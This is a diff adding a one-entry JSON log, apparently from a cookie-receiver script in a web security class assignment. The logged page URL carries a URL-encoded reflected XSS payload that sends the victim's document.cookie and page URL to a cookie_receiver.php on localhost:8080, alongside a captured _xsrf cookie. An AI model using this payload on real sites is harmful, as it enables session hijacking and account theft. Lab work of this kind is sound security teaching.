@@ -1,0 +1,9 @@
+[
+  {
+    "timestamp": "2025-12-06T18:19:34.953572",
+    "ip_address": "127.0.0.1",
+    "page_url": "http://localhost/assignment/vulnerable_page.php?search=%3Cscript%3Evar%20i%3Dnew%20Image%28%29%3Bi.src%3D%27http%3A//localhost%3A8080/cookie_receiver.php%3Fcookie%3D%27%2BencodeURIComponent%28document.cookie%29%2B%27%26url%3D%27%2BencodeURIComponent%28window.location.href%29%3B%3C/script%3E",
+    "cookie": "_xsrf=2|be4d60f9|baa7ffca787b4d58a64b8865205cc94d|1764698960",
+    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"
+  }
+]
